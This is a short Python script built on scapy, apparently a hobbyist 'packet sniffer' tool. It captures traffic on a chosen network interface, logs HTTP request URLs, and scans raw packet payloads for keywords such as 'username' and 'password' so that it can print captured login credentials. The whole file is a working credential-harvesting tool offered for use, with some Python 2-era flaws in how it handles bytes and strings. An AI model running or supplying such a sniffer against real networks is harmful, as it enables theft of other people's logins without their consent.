import scapy.all as scapy
from scapy.layers import http

print("\t\t\t\t[+] << PACKET-SNIFFER >> [+]")

inter_face = input("\n[+] Enter Interface: ")

print("\n\n")
def sniff(interface):
	scapy.sniff(iface=interface,store=False,prn=sniff_Packet)

def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_information(packet):
	if packet.haslayer(scapy.Raw):
		load = packet[scapy.Raw].load
		keys = ["username","login","password","user","pass"]
		for keyword in keys:
			if keyword in load:
				return load
				break

def sniff_Packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		print("[+] HTTP REQUEST >>" + url)

		login_info = get_login_information(packet)
		if login_info:
			print("\n\n[+] Possible User/Password >> " + login_info + "\n\n")

sniff(inter_face)